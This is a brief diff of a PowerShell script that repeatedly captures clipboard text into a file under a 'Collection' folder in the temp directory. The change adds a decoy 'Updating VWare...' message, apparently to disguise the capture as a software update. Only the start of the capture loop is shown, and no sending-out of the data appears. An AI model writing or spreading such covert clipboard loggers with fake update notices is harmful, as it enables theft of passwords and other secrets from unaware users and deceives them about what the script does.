@@ -2,6 +2,8 @@ Add-Type -AssemblyName System.Windows.Forms
 
 $outputFilePath = "$env:TEMP\Collection\ClipboardContent.txt"
 
+Write-Host "Updating VWare..."
+
 $previousText = ""
 while ($true) {
     $currentText = [System.Windows.Forms.Clipboard]::GetText()
